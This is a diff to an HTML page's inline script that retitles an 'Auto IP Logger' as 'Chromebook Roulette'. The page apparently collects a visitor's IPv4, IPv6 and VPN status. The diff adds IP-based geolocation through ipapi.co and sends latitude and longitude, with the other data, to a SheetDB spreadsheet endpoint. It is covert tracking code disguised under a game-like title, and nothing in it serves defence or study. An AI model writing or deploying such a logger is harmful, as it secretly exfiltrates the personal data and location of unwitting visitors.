@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto IP Logger</title>
+    <title>Chromebook Roulette</title>
     <script>
         const apiUrl = "https://sheetdb.io/api/v1/d6desiq4gglnm";
 
         async function getIPData() {
-            let ipv4 = "Unknown", ipv6 = "Unknown", vpnStatus = "Unknown";
+            let ipv4 = "Unknown", ipv6 = "Unknown", vpnStatus = "Unknown", latitude = "Unknown", longitude = "Unknown";
 
             try {
                 // Fetch IPv4 & IPv6
@@ -32,16 +32,32 @@
                 console.error("VPN Check Error:", error);
             }
 
+            // Get Location via IP
+            const { latitude: ipLatitude, longitude: ipLongitude } = await getLocationByIP(ipv4);
+            latitude = ipLatitude;
+            longitude = ipLongitude;
+
             // Send data to SheetDB
-            sendDataToSheet(ipv4, ipv6, vpnStatus);
+            sendDataToSheet(ipv4, ipv6, vpnStatus, latitude, longitude);
         }
 
-        async function sendDataToSheet(ipv4, ipv6, vpnStatus) {
+        async function getLocationByIP(ipv4) {
+            try {
+                const locationResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
+                const locationData = await locationResponse.json();
+                return { latitude: locationData.latitude, longitude: locationData.longitude };
+            } catch (error) {
+                console.error("IP Geolocation Error:", error);
+                return { latitude: "Unknown", longitude: "Unknown" };
+            }
+        }
+
+        async function sendDataToSheet(ipv4, ipv6, vpnStatus, latitude, longitude) {
             const response = await fetch(apiUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    data: { IPV4: ipv4, IPV6: ipv6, "Is Using VPN?": vpnStatus }
+                    data: { IPV4: ipv4, IPV6: ipv6, "Is Using VPN?": vpnStatus, Latitude: latitude, Longitude: longitude }
                 })
             });
 
